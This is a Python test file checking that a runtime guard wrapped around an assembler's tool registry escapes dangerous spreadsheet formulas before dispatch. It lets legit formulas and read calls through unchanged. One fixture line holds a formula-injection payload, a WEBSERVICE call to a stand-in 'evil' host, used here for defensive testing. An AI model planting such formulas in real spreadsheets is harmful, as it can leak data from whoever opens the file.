#!/usr/bin/env python3
"""
Proves runtime_overlay.install() wires the guard onto the REAL assembler ToolRegistry
(and the run_once _RecordingRegistry subclass) WITHOUT importing/editing assembler.py
from the production path — the overlay loads the assembler the same way run_once does,
by file path, and rebinds one instance method.

The test builds a registry whose .call dispatches to a fake server, installs the guard,
and asserts the dangerous arg is neutralized BEFORE it reaches the fake dispatcher,
while a legit formula passes through unchanged.
"""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

_SAN_DIR = Path(__file__).resolve().parents[1]
_REPO = _SAN_DIR.parents[1]
sys.path.insert(0, str(_SAN_DIR))

from runtime_overlay import install, default_guard  # noqa: E402


def _load_assembler():
    path = _REPO / "platform" / "assembler" / "assembler.py"
    spec = importlib.util.spec_from_file_location("puppet_assembler_t", path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def test_install_wraps_real_toolregistry_call():
    asm = _load_assembler()

    # Build a ToolRegistry instance without booting MCP servers: bypass __init__ and
    # set the one field its .call() reads (_servers maps tool name -> server object).
    reg = asm.ToolRegistry.__new__(asm.ToolRegistry)
    seen = {}

    class _FakeServer:
        name = "excel"
        def call_tool(self, tool_name, arguments):
            seen["args"] = arguments          # what actually reaches the dispatcher
            return "ok"

    reg._servers = {"write_data_to_excel": _FakeServer(),
                    "apply_formula": _FakeServer()}

    install(reg, guard=default_guard())

    # 1) dangerous payload → neutralized before dispatch
    reg.call("write_data_to_excel", {
        "filepath": "x.xlsx", "sheet_name": "S",
        "data": [["a", '=WEBSERVICE("http://evil")']], "start_cell": "A1",
    })
    dispatched = seen["args"]["data"][0][1]
    assert dispatched.startswith("'="), f"payload reached dispatcher unneutralized: {dispatched!r}"

    # 2) legit formula → passes through untouched
    reg.call("apply_formula", {
        "filepath": "x.xlsx", "sheet_name": "S", "cell": "D5",
        "formula": "=SUMIFS(A:A,B:B,1)",
    })
    assert seen["args"]["formula"] == "=SUMIFS(A:A,B:B,1)", "legit formula was altered"

    # 3) non-write tool → arguments untouched (identity)
    reg._servers["read_data_from_excel"] = _FakeServer()
    reg.call("read_data_from_excel", {"filepath": "x.xlsx", "sheet_name": "S"})
    assert seen["args"] == {"filepath": "x.xlsx", "sheet_name": "S"}
